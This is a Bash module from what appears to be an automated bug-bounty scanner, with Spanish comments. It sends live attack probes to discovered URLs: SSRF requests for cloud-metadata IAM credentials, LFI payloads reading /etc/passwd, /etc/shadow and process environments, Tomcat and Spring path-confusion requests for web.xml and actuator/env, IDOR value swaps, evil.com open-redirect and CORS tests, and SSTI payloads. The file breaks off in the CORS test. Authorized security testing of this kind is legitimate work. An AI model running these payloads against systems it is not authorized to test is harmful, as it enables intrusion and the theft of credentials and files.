#!/usr/bin/env bash
# ============================================================
#  modules/20_smart_scan.sh
#  Fase 20: Smart Scan guiado por Knowledge Base
#
#  Para cada URL/parámetro descubierto, consulta la KB
#  y lanza tests específicos según:
#    - Nombre del parámetro → SSRF, IDOR, Open Redirect...
#    - Ruta del endpoint    → GraphQL, OAuth, Upload...
#    - Tech detectada       → SSTI según framework, SQLi según DB
#    - Respuesta HTTP       → headers CORS, cache, etc.
#
#  Basado en:
#    - HackerOne Top Reports (frecuencia y bounty real)
#    - PayloadsAllTheThings (payloads actualizados)
#    - HackTricks (metodología de detección)
#    - HowToHunt (patrones de parámetros)
# ============================================================

MODULE_NAME="smart_scan"
MODULE_DESC="Smart Scan guiado por Knowledge Base"

KB_PATH="${SCRIPT_DIR}/core/knowledge_base.json"

# ── Cargar KB ────────────────────────────────────────────────
_kb_get_vuln() {
  local VULN_ID="$1"
  python3 -c "
import json, sys
kb = json.load(open('${KB_PATH}'))
for v in kb['vulnerabilities']:
    if v['id'] == '${VULN_ID}':
        print(json.dumps(v))
        sys.exit(0)
" 2>/dev/null
}

_kb_match_param() {
  # Clasificación inteligente por NOMBRE y VALOR del parámetro.
  # No depende de listas de nombres exactos — infiere la clase del input
  # a partir de patrones semánticos en el nombre Y en el valor.
  local PARAM="$1"
  local VALUE="${2:-}"   # valor actual del param (opcional)
  python3 -c "
import json, re, urllib.parse

param = '${PARAM}'.lower()
value = urllib.parse.unquote('${VALUE}')
matches = set()

# ── 1. Clasificación por VALOR (más fiable que el nombre) ──────────────
# Valor URL-like → SSRF + Open Redirect
if value and re.match(r'^https?://|^//|^ftp://|^file://', value, re.I):
    matches.update(['SSRF', 'OPEN_REDIRECT'])

# Valor path-like → LFI
if value and re.search(r'[./\\\\]{2}|\.php|\.jsp|\.asp|\.xml|\.conf|\.ini|/etc/|WEB-INF', value, re.I):
    matches.add('LFI')

# Valor numérico simple → IDOR
if value and re.match(r'^\d{1,10}$', value):
    matches.add('IDOR')

# UUID → IDOR
if value and re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.I):
    matches.add('IDOR')

# Valor base64/token largo → no agregar SQLi/XSS
is_token = value and (len(value) > 60 or re.match(r'^[A-Za-z0-9+/=_-]{40,}$', value))

# Cualquier valor no-token + no-técnico → XSS (siempre) + SQLi
if not is_token:
    matches.update(['XSS_STORED', 'SQLI'])

# ── 2. Clasificación por NOMBRE (pistas semánticas adicionales) ────────
# Palabras que implican navegación/redirección
if re.search(r'(redir|redirect|return|next|goto|url|uri|href|link|dest|forward|back|after|ext|external|out|exit|away|jump|action|location|ret|success|cancel|error|ref)', param, re.I):
    matches.add('OPEN_REDIRECT')

# Palabras que implican carga de recursos remotos
if re.search(r'(url|src|source|fetch|load|remote|import|export|feed|endpoint|api|webhook|proxy|target|server|host|domain|origin|callback|data)', param, re.I):
    matches.add('SSRF')

# Palabras que implican fichero/ruta
if re.search(r'(file|path|page|include|load|read|view|doc|dir|folder|root|template|skin|theme|tpl|tmpl|layout|partial|block|module|component|script|conf|ini|cfg|src|import|resource)', param, re.I):
    matches.add('LFI')

# Palabras que implican identidad/entidad
if re.search(r'(id$|_id$|uid$|pid$|num$|no$|nr$|seq$|idx$|ref$|key$|code$|guid$|uuid$|hash$|token$|slug$|handle$|user$|account$|member$|client$|page$|node$|article$|item$|order$|record$|object$|resource$|group$|project$|task$|report$|chat$)', param, re.I):
    matches.add('IDOR')

# Palabras que implican plantilla/renderizado
if re.search(r'(template|render|view|theme|layout|lang|locale|format|output|tpl|tmpl|skin|display|mode)', param, re.I):
    matches.add('SSTI')

# ── 3. KB como capa adicional (nombres exactos conocidos) ──────────────
try:
    kb = json.load(open('${KB_PATH}'))
    for v in kb['vulnerabilities']:
        params = v.get('trigger_params', [])
        if param in [p.lower() for p in params]:
            matches.add(v['id'])
except Exception:
    pass

print(' '.join(sorted(matches)))
" 2>/dev/null
}

_kb_match_path() {
  local PATH_="$1"
  python3 -c "
import json
kb = json.load(open('${KB_PATH}'))
matches = []
for v in kb['vulnerabilities']:
    paths = v.get('trigger_paths', [])
    for p in paths:
        if p.lower() in '${PATH_}'.lower():
            if v['id'] not in matches:
                matches.append(v['id'])
print(' '.join(matches))
" 2>/dev/null
}

_kb_match_tech() {
  local TECH="$1"
  python3 -c "
import json
kb = json.load(open('${KB_PATH}'))
matches = []
for v in kb['vulnerabilities']:
    techs = v.get('trigger_techs', [])
    if 'any' in techs or '${TECH}' in techs:
        matches.append(v['id'])
print(' '.join(matches))
" 2>/dev/null
}

_kb_get_payloads() {
  local VULN_ID="$1"
  python3 -c "
import json
kb = json.load(open('${KB_PATH}'))
for v in kb['vulnerabilities']:
    if v['id'] == '${VULN_ID}':
        for p in v.get('payloads', [])[:5]:
            print(p)
        break
" 2>/dev/null
}

_kb_get_nuclei_tags() {
  local VULN_ID="$1"
  python3 -c "
import json
kb = json.load(open('${KB_PATH}'))
for v in kb['vulnerabilities']:
    if v['id'] == '${VULN_ID}':
        print(','.join(v.get('nuclei_tags', [])))
        break
" 2>/dev/null
}

# ── Helpers ──────────────────────────────────────────────────

# Sustituye el valor de PARAM en URL, o lo añade si no existe
_url_set_param() {
  local BASE_URL="$1" P="$2" NEW_VAL="$3"
  if echo "$BASE_URL" | grep -qP "[?&]${P}="; then
    echo "$BASE_URL" | sed -E "s|([?&]${P}=)[^&]*|\1${NEW_VAL}|"
  elif echo "$BASE_URL" | grep -q '?'; then
    echo "${BASE_URL}&${P}=${NEW_VAL}"
  else
    echo "${BASE_URL}?${P}=${NEW_VAL}"
  fi
}

# ── Tests por tipo de vuln ────────────────────────────────────

_test_ssrf() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"
  log_info "  🔍 SSRF test: $URL ($PARAM)"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # ── Técnica 1: OOB callback (Interactsh / configurado) ──────
  local CALLBACK="${SSRF_CALLBACK:-}"
  if [[ -n "$CALLBACK" ]] && command -v nuclei &>/dev/null; then
    local SSRF_TEST_URL
    SSRF_TEST_URL=$(_url_set_param "$URL" "$PARAM" "$CALLBACK")
    nuclei -u "$SSRF_TEST_URL" -tags ssrf,oob -silent -jsonl 2>/dev/null \
    | head -5 | while IFS= read -r LINE; do
        local TEMPLATE SEV
        TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
        log_warn "  ⚡ SSRF (OOB): $URL"
        notify_nuclei_finding "$DOMAIN" "$TEMPLATE" "$SEV" "$URL" "SSRF via param $PARAM"
        db_add_finding "$DOMAIN_ID" "smart_ssrf" "$SEV" "$URL" "$TEMPLATE" "Param: $PARAM"
      done
  fi

  # ── Técnica 2: Cloud metadata + localhost (blind SSRF sin OOB) ──
  # Diferente tamaño/status respecto a un valor neutral indica SSRF
  local BASELINE_STATUS BASELINE_LEN
  BASELINE_STATUS=$(curl -sL --max-time 8 ${CURL_PROXY} \
    -o /dev/null -w "%{http_code}" \
    "$(_url_set_param "$URL" "$PARAM" "invalid_ssrf_test_value")" 2>/dev/null)
  BASELINE_LEN=$(curl -sL --max-time 8 ${CURL_PROXY} \
    -w "%{size_download}" -o /dev/null \
    "$(_url_set_param "$URL" "$PARAM" "invalid_ssrf_test_value")" 2>/dev/null || echo 0)

  local SSRF_PROBES=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://100.100.100.200/latest/meta-data/"
    "http://localhost/"
    "http://127.0.0.1/"
    "http://[::1]/"
    "http://0.0.0.0/"
    "http://192.168.0.1/"
  )
  for PROBE in "${SSRF_PROBES[@]}"; do
    local PROBE_STATUS PROBE_LEN
    PROBE_STATUS=$(curl -sL --max-time 8 ${CURL_PROXY} \
      -o /dev/null -w "%{http_code}" \
      "$(_url_set_param "$URL" "$PARAM" "$PROBE")" 2>/dev/null)
    PROBE_LEN=$(curl -sL --max-time 8 ${CURL_PROXY} \
      -w "%{size_download}" -o /dev/null \
      "$(_url_set_param "$URL" "$PARAM" "$PROBE")" 2>/dev/null || echo 0)

    # Señal de SSRF: status distinto o respuesta considerablemente más grande
    if [[ "$PROBE_STATUS" != "$BASELINE_STATUS" ]] && \
       [[ "$PROBE_STATUS" == "200" || "$PROBE_STATUS" == "301" || "$PROBE_STATUS" == "302" ]]; then
      # Generali fix 2026-05-11 (Bug #17): descartar páginas WAF block que generan
      # 200/403 sintético con HTML _Incapsula_Resource o cf-ray, no SSRF real.
      local _SSRF_BODY
      _SSRF_BODY=$(curl -sL --max-time 5 ${CURL_PROXY} \
        "$(_url_set_param "$URL" "$PARAM" "$PROBE")" 2>/dev/null | head -c 2000)
      if echo "$_SSRF_BODY" | grep -qiE '_Incapsula_Resource|Request unsuccessful|cf-ray|Attention Required.*Cloudflare|Just a moment\.\.\.|Akamai.*Reference #|AWS.*Request blocked'; then
        continue
      fi
      log_warn "  ⚡ Posible SSRF: $URL ($PARAM → $PROBE, HTTP $PROBE_STATUS)"
      _telegram_send "🔗 *Posible SSRF detectado*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📝 Param: \`${PARAM}\` → \`${PROBE}\`
📊 Status: ${PROBE_STATUS} (baseline: ${BASELINE_STATUS})
⚠️ Verificar manualmente
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      db_add_finding "$DOMAIN_ID" "smart_ssrf" "high" \
        "$URL" "ssrf_metadata" "Param $PARAM → $PROBE (HTTP $PROBE_STATUS vs baseline $BASELINE_STATUS)"
      break
    fi
    # Respuesta mucho mayor que baseline → servidor intentó hacer fetch y recibió contenido
    if [[ -n "$PROBE_LEN" && -n "$BASELINE_LEN" ]] && \
       [[ "$PROBE_LEN" -gt $((BASELINE_LEN + 200)) ]] && \
       [[ "$PROBE_STATUS" == "200" ]]; then
      log_warn "  ⚡ Posible SSRF (contenido extra): $URL ($PARAM → $PROBE)"
      db_add_finding "$DOMAIN_ID" "smart_ssrf" "medium" \
        "$URL" "ssrf_content_diff" "Param $PARAM → $PROBE (len $PROBE_LEN vs baseline $BASELINE_LEN)"
      break
    fi
  done
}

_test_lfi() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"
  log_info "  🔍 LFI test: $URL ($PARAM)"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local PAYLOADS=(
    "../../../../etc/passwd"
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/convert.base64-encode/resource=../index.php"
    "file:///etc/passwd"
    "/etc/passwd"
    "/etc/shadow"
    "C:\\Windows\\System32\\drivers\\etc\\hosts"
    "../../../../proc/self/environ"
    "../../../../var/log/apache2/access.log"
    "../../../../WEB-INF/web.xml"
    "../../../../META-INF/MANIFEST.MF"
  )

  # Firmas de archivos sensibles Unix/Windows
  local UNIX_SIG="root:x:0\|root:0:0\|daemon:x:\|nobody:x:\|www-data:x:\|/bin/bash\|/bin/sh"
  local WIN_SIG="\[boot loader\]\|\[fonts\]\|ECHO\|\\\\System32"
  local JAVA_SIG="<web-app\|<servlet\|Manifest-Version:\|Main-Class:"
  local ENV_SIG="PATH=\|HOME=\|USER=\|SHELL=\|PWD="

  local BASELINE
  BASELINE=$(curl -sL --max-time 8 ${CURL_PROXY} "$URL" 2>/dev/null | head -c 2000)

  for PAYLOAD in "${PAYLOADS[@]}"; do
    local TEST_URL BODY
    TEST_URL=$(_url_set_param "$URL" "$PARAM" "$PAYLOAD")
    BODY=$(curl -sL --max-time 8 ${CURL_PROXY} "$TEST_URL" 2>/dev/null | head -c 4000)

    if echo "$BODY" | grep -qE "$UNIX_SIG|$WIN_SIG|$JAVA_SIG|$ENV_SIG"; then
      # Confirmar que no estaba en la baseline
      if ! echo "$BASELINE" | grep -qE "$UNIX_SIG|$WIN_SIG|$JAVA_SIG|$ENV_SIG"; then
        log_warn "  ⚡ LFI confirmado: $TEST_URL"
        _telegram_send "📂 *LFI Confirmado*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📝 Param: \`${PARAM}\` → \`${PAYLOAD}\`
⚠️ Archivo sensible leído — revisar urgente
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
        db_add_finding "$DOMAIN_ID" "smart_lfi" "critical" \
          "$URL" "lfi_direct" "Param $PARAM → $PAYLOAD"
        return 0
      fi
    fi
  done
  return 1
}

# ── Path Confusion (Orange Tsai) ─────────────────────────────
# Se ejecuta sobre TODOS los hosts — no depende de detección de tech.
# Prueba técnicas de confusión de path conocidas:
#   1. Tomcat ..;/ — CVE-2025-24813 y técnica clásica
#   2. Spring /.. normalización — CVE-2024-38819
#   3. Semicolon JAX-RS: /api/user;role=admin/
#   4. Suffix confusion: /api/endpoint.json vs /api/endpoint
_test_path_confusion() {
  local HOST="$1" DOMAIN_ID="$2" DOMAIN="$3"
  log_info "  🔍 Path confusion (Orange Tsai): $HOST"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # Baseline: respuesta a path inexistente — tamaño y status para detectar SPA catch-all
  local BASELINE_404 BASELINE_LEN BASELINE_BODY
  BASELINE_BODY=$(curl -sL --max-time 8 ${CURL_PROXY} \
    -w "\n###STATUS###%{http_code}\n###LEN###%{size_download}" \
    "${HOST}/this-path-does-not-exist-$(openssl rand -hex 4)" 2>/dev/null)
  BASELINE_404=$(echo "$BASELINE_BODY" | grep -oP '(?<=###STATUS###)\d+' | tail -1)
  BASELINE_LEN=$(echo "$BASELINE_BODY"  | grep -oP '(?<=###LEN###)\d+' | tail -1)
  BASELINE_LEN="${BASELINE_LEN:-0}"
  # Si el baseline ya es 200 + HTML → servidor SPA que sirve index.html para todo
  local IS_SPA_CATCHALL=false
  local BASELINE_CONTENT
  BASELINE_CONTENT=$(echo "$BASELINE_BODY" | head -c 50 | tr '[:upper:]' '[:lower:]')
  if [[ "$BASELINE_404" == "200" ]] && echo "$BASELINE_CONTENT" | grep -q "<!doctype html"; then
    IS_SPA_CATCHALL=true
  fi

  # ── 1. Tomcat ..;/ (WEB-INF, actuator, admin) ──────────────
  local TOMCAT_PROBES=(
    "/nonexistent/..;/WEB-INF/web.xml"
    "/api/..;/WEB-INF/web.xml"
    "/app/..;/WEB-INF/web.xml"
    "/api/..;/META-INF/MANIFEST.MF"
    "/api/..;/actuator/env"
    "/api/..;/actuator/mappings"
    "/app/..;/admin"
    "/..;/admin"
    "/..;/manager/html"
  )

  for PROBE in "${TOMCAT_PROBES[@]}"; do
    local STATUS BODY
    BODY=$(curl -sL --max-time 8 ${CURL_PROXY} \
      -w "\n###STATUS###%{http_code}" \
      "${HOST}${PROBE}" 2>/dev/null)
    STATUS=$(echo "$BODY" | grep -oP '(?<=###STATUS###)\d+' | tail -1)
    BODY="${BODY%$'\n'###STATUS###*}"

    # Excluir respuestas WAF/rate-limit
    [[ "$STATUS" =~ ^(400|418|429|444|406|503)$ ]] && continue
    # Bug #13: solo flagear si el body realmente expone el archivo target.
    # Status diff (403 vs 404, 401 vs 404) NO es bypass — es comportamiento WAF normal.
    [[ "$STATUS" != "200" ]] && continue

    # Skip catch-all hosts (SPAs sirven 200/HTML para todo)
    if [[ -n "$IS_SPA_CATCHALL" ]] && $IS_SPA_CATCHALL; then continue; fi

    # Validación de shape del body según target del probe
    local IS_REAL=false
    if echo "$PROBE" | grep -q "web.xml"; then
      _validate_web_xml "$BODY" && IS_REAL=true
    elif echo "$PROBE" | grep -q "MANIFEST"; then
      _validate_manifest "$BODY" && IS_REAL=true
    elif echo "$PROBE" | grep -q "actuator"; then
      _validate_actuator_response "$BODY" "" && IS_REAL=true
    elif echo "$PROBE" | grep -qE "/admin|/manager"; then
      # Admin: body distinto del baseline (>50% diff) y no parece SPA shell
      local LEN=${#BODY}
      [[ "$LEN" -gt 200 ]] && \
        [[ "$BASELINE_LEN" -eq 0 || "$LEN" -gt $((BASELINE_LEN * 3 / 2)) || "$LEN" -lt $((BASELINE_LEN / 2)) ]] && \
        IS_REAL=true
    fi

    $IS_REAL || continue

    log_warn "  ⚡ Path confusion (Tomcat ..;/) confirmada: ${HOST}${PROBE}"
    _telegram_send "🔄 *Path Confusion confirmada (body match)*
🌐 \`${DOMAIN}\`
🔗 \`${HOST}${PROBE}\`
🔧 Técnica: Tomcat ..;/ confusion
📊 HTTP $STATUS
✅ Body verificado: archivo protegido expuesto
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    db_add_finding "$DOMAIN_ID" "path_confusion" "critical" \
      "${HOST}${PROBE}" "tomcat_semicolon" "Tomcat ..;/ confirmado — body match en target ${PROBE}"
    break
  done

  # ── 2. Semicolon JAX-RS path parameter injection ─────────────
  # /api/endpoint;param=injected → servidor ignora ;param=injected, WAF no
  local SEMI_PROBES=(
    "/api/admin;test=1"
    "/api/v1/admin;test=1"
    "/admin;ext=.jpg"
    "/admin;.css"
    "/admin;jsessionid=test"
    "/actuator;test=1"
    "/actuator/env;test=1"
  )

  for PROBE in "${SEMI_PROBES[@]}"; do
    local STATUS
    STATUS=$(curl -sL --max-time 8 ${CURL_PROXY} \
      -o /dev/null -w "%{http_code}" \
      "${HOST}${PROBE}" 2>/dev/null)
    [[ "$STATUS" =~ ^(418|429|444|406)$ ]] && continue
    if [[ "$STATUS" == "200" || ( "$STATUS" == "401" || "$STATUS" == "403" ) ]]; then
      # Comparar con el path sin semicolon
      local BASE_PROBE="${PROBE%%;*}"
      local BASE_STATUS
      BASE_STATUS=$(curl -sL --max-time 8 ${CURL_PROXY} \
        -o /dev/null -w "%{http_code}" \
        "${HOST}${BASE_PROBE}" 2>/dev/null)
      if [[ "$STATUS" != "$BASE_STATUS" ]]; then
        log_warn "  ⚡ Path confusion (semicolon): ${HOST}${PROBE} → HTTP $STATUS (sin ';': $BASE_STATUS)"
        db_add_finding "$DOMAIN_ID" "path_confusion" "medium" \
          "${HOST}${PROBE}" "semicolon_confusion" "Semicolon confusion: $STATUS vs base $BASE_STATUS"
      fi
    fi
  done

  # ── 3. Spring path traversal CVE-2024-38819 ─────────────────
  # /path/anything/../protected vs /protected — Spring normaliza, proxy no
  # IMPORTANTE: SPAs sirven index.html (200+HTML) para cualquier path → falso positivo
  local SPRING_PROBES=(
    "/actuator/xxx/../env"
    "/api/public/xxx/../admin"
    "/static/xxx/../WEB-INF/web.xml"
    "/resources/xxx/../META-INF/MANIFEST.MF"
  )

  $IS_SPA_CATCHALL && { log_info "  ℹ️  SPA catch-all detectado — skip Spring traversal (false positive)"; return; }

  for PROBE in "${SPRING_PROBES[@]}"; do
    local STATUS RESP_BODY RESP_CTYPE
    RESP_BODY=$(curl -sL --max-time 8 ${CURL_PROXY} \
      -D /tmp/_pathconf_headers_$$.txt \
      "${HOST}${PROBE}" 2>/dev/null)
    STATUS=$(grep -oP 'HTTP/\S+ \K\d+' /tmp/_pathconf_headers_$$.txt 2>/dev/null | tail -1)
    RESP_CTYPE=$(grep -i 'content-type:' /tmp/_pathconf_headers_$$.txt 2>/dev/null | tail -1 | tr '[:upper:]' '[:lower:]')
    rm -f /tmp/_pathconf_headers_$$.txt
    [[ "$STATUS" != "200" ]] && continue
    # Falso positivo si body es HTML (SPA index) o mismo tamaño que baseline 404
    local RESP_LEN=${#RESP_BODY}
    echo "$RESP_BODY" | head -c 50 | grep -qi "<!doctype html" && continue
    echo "$RESP_CTYPE" | grep -q "text/html" && continue
    [[ "$RESP_LEN" -le "$((BASELINE_LEN + 50))" && "$RESP_LEN" -ge "$((BASELINE_LEN - 50))" ]] && [[ "$BASELINE_LEN" -gt 0 ]] && continue
    # Verificar contenido específico según el path
    local IS_REAL=false
    echo "$PROBE" | grep -q "actuator"   && echo "$RESP_BODY" | grep -qi '"activeProfiles"\|"propertySources"\|"systemProperties"' && IS_REAL=true
    echo "$PROBE" | grep -q "web.xml"    && echo "$RESP_BODY" | grep -qi '<?xml\|<web-app\|<servlet' && IS_REAL=true
    echo "$PROBE" | grep -q "MANIFEST"   && echo "$RESP_BODY" | grep -qi 'Manifest-Version\|Main-Class\|Implementation' && IS_REAL=true
    echo "$PROBE" | grep -q "admin"      && [[ "$STATUS" == "200" ]] && IS_REAL=true
    $IS_REAL || continue
    log_warn "  ⚡ Path confusion (Spring traversal): ${HOST}${PROBE} → HTTP $STATUS"
    db_add_finding "$DOMAIN_ID" "path_confusion" "high" \
      "${HOST}${PROBE}" "spring_traversal" "Spring path traversal → HTTP $STATUS"
  done
}

_test_idor() {
  local URL="$1" PARAM="$2" VALUE="$3" DOMAIN_ID="$4" DOMAIN="$5"
  log_info "  🔍 IDOR test: $URL ($PARAM=$VALUE)"

  # Intentar valores adyacentes
  local ORIG_VAL="$VALUE"
  local TEST_VALS=()

  if echo "$VALUE" | grep -qP '^\d+$'; then
    TEST_VALS=( $((VALUE + 1)) $((VALUE - 1)) 1 2 3 100 )
  else
    TEST_VALS=( "1" "2" "admin" "0" "null" )
  fi

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local URL_DOMAIN
  URL_DOMAIN=$(echo "$URL" | grep -oP 'https?://\K[^/?#]+')

  local ORIG_RESPONSE ORIG_LEN ORIG_STATUS ORIG_EFF
  ORIG_RESPONSE=$(curl -sL --max-time 10 ${CURL_PROXY} \
    -w "\n###STATUS###%{http_code}\n###EFF###%{url_effective}" \
    "$(_url_set_param "$URL" "$PARAM" "$ORIG_VAL")" 2>/dev/null)
  ORIG_STATUS=$(echo "$ORIG_RESPONSE" | grep -oP '(?<=###STATUS###)\d+' | tail -1)
  ORIG_EFF=$(echo "$ORIG_RESPONSE" | grep -oP '(?<=###EFF###).*' | tail -1)
  ORIG_LEN=${#ORIG_RESPONSE}

  # Si la URL base ya redirige fuera del dominio, el módulo no puede comparar respuestas
  if [[ -n "$ORIG_EFF" ]] && ! echo "$ORIG_EFF" | grep -q "$URL_DOMAIN"; then
    log_info "  Skipping IDOR — $URL redirige fuera del dominio ($ORIG_EFF)"
    return 0
  fi

  for TEST_VAL in "${TEST_VALS[@]}"; do
    [[ "$TEST_VAL" == "$ORIG_VAL" ]] && continue

    local TEST_URL
    TEST_URL=$(_url_set_param "$URL" "$PARAM" "$TEST_VAL")

    local TEST_RESPONSE TEST_STATUS TEST_LEN TEST_EFF
    TEST_RESPONSE=$(curl -sL --max-time 10 ${CURL_PROXY} \
      -w "\n###STATUS###%{http_code}\n###EFF###%{url_effective}" "$TEST_URL" 2>/dev/null)
    TEST_STATUS=$(echo "$TEST_RESPONSE" | grep -oP '(?<=###STATUS###)\d+' | tail -1)
    TEST_EFF=$(echo "$TEST_RESPONSE" | grep -oP '(?<=###EFF###).*' | tail -1)
    TEST_LEN=${#TEST_RESPONSE}

    # Si este valor redirige fuera del dominio, el body es de otro sitio → FP
    if [[ -n "$TEST_EFF" ]] && ! echo "$TEST_EFF" | grep -q "$URL_DOMAIN"; then
      continue
    fi

    if [[ "$TEST_STATUS" == "200" ]] && \
       [[ "$ORIG_STATUS" == "200" ]] && \
       [[ "$TEST_LEN" -gt 100 ]] && \
       _validate_idor_diff "$ORIG_LEN" "$TEST_LEN" "$ORIG_RESPONSE"; then
      # Bug #3: pasó threshold dinámico Y baseline no es SPA shell
      log_warn "  ⚡ Posible IDOR: $TEST_URL (len=$TEST_LEN vs orig=$ORIG_LEN)"
      _telegram_send "🎯 *Posible IDOR detectado*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📝 Param: \`${PARAM}\` (${ORIG_VAL} → ${TEST_VAL})
📊 Response: ${TEST_LEN} bytes (original: ${ORIG_LEN})
⚠️ Verificar manualmente
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      db_add_finding "$DOMAIN_ID" "smart_idor" "medium" \
        "$URL" "idor_param_swap" "Param $PARAM: $ORIG_VAL → $TEST_VAL (diff len)"
    fi
  done
}

_test_open_redirect() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"
  log_info "  🔍 Open Redirect test: $URL?$PARAM"

  local PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "/\\evil.com"
    "https://evil.com%23.${DOMAIN}"
  )

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # Strip existing query string — avoids evil.com appearing only as a param
  # value in the original URL (false positive where ?next=...&redirect=evil.com)
  local BASE_URL="${URL%%\?*}"

  for PAYLOAD in "${PAYLOADS[@]}"; do
    local RESPONSE STATUS LOCATION
    RESPONSE=$(curl -s --max-time 8 \
      -o /dev/null \
      -w "%{http_code}|%{redirect_url}" \
      ${CURL_PROXY} \
      "${BASE_URL}?${PARAM}=${PAYLOAD}" 2>/dev/null)
    STATUS=$(echo "$RESPONSE" | cut -d'|' -f1)
    LOCATION=$(echo "$RESPONSE" | cut -d'|' -f2)

    # Extraer solo el HOST del Location — descartar si evil.com solo aparece
    # como valor de parámetro en el query string (false positive típico)
    local LOCATION_HOST
    LOCATION_HOST=$(echo "$LOCATION" | sed -E 's|https?://([^/?#]*).*|\1|')

    if [[ "$STATUS" =~ ^(301|302|303|307|308)$ ]] && \
       echo "$LOCATION_HOST" | grep -qiE "(^|\.)evil\.com$"; then
      log_warn "  ⚡ Open Redirect confirmado: $URL?$PARAM=$PAYLOAD → $LOCATION"
      _telegram_send "↪️ *Open Redirect confirmado*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📝 Payload: \`${PAYLOAD}\`
🎯 Redirige a: \`${LOCATION}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      db_add_finding "$DOMAIN_ID" "smart_redirect" "medium" \
        "$URL" "open_redirect" "Param $PARAM redirect to evil.com"
      break
    fi
  done
}

_test_ssti() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"
  log_info "  🔍 SSTI test: $URL?$PARAM"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # Números grandes y poco frecuentes → mínima probabilidad de colisión con
  # contenido estático de la página (fechas, IDs, etc.)
  local PAYLOADS=( "{{9887*9887}}" "\${9887*9887}" "#{9887*9887}" "<%= 9887*9887 %>" )
  local EXPECTED="97753769"

  # Baseline: si el número ya aparece sin payload → skip (dos comprobaciones)
  local BASELINE BASELINE2
  BASELINE=$(curl -sL --max-time 8 ${CURL_PROXY} "${URL}" 2>/dev/null)
  if echo "$BASELINE" | grep -q "$EXPECTED"; then
    return
  fi
  # Segunda baseline con el parámetro presente pero valor inocuo — descarta
  # páginas que reflejan cualquier input numérico sin evaluarlo
  BASELINE2=$(curl -sL --max-time 8 ${CURL_PROXY} "$(_url_set_param "$URL" "$PARAM" "1")" 2>/dev/null)
  if echo "$BASELINE2" | grep -q "$EXPECTED"; then
    return
  fi

  for PAYLOAD in "${PAYLOADS[@]}"; do
    local ENCODED
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))" 2>/dev/null || echo "$PAYLOAD")
    local BODY
    BODY=$(curl -sL --max-time 8 ${CURL_PROXY} \
      "$(_url_set_param "$URL" "$PARAM" "$ENCODED")" 2>/dev/null)

    if echo "$BODY" | grep -q "$EXPECTED"; then
      log_warn "  ⚡ SSTI confirmado ($PAYLOAD → $EXPECTED): $URL"
      _telegram_send "🚨 *SSTI confirmado*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📝 Payload: \`${PAYLOAD}\` → \`${EXPECTED}\`
⚠️ Potencial RCE — revisar urgente
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      db_add_finding "$DOMAIN_ID" "smart_ssti" "critical" \
        "$URL" "ssti" "Payload $PAYLOAD evaluó a $EXPECTED"
      break
    fi
  done
}

_test_cors() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local ACAO
  ACAO=$(curl -sI --max-time 8 \
    -H "Origin: https://evil.com" \
    ${CURL_PROXY} "$URL" 2>/dev/null | grep -i "Access-Control-Allow-Origin")

  if echo "$ACAO" | grep -qi "evil.com\|\*"; then
    local ACAC
    ACAC=$(curl -sI --max-time 8 \
      -H "Origin: https://evil.com" \
      ${CURL_PROXY} "$URL" 2>/dev/null | grep -i "Access-Control-Allow-Credentials")

    local SEV="low"
    echo "$ACAC" | grep -qi "true" && SEV="high"

    log_warn "  ⚡ CORS misconfig [$SEV]: $URL"
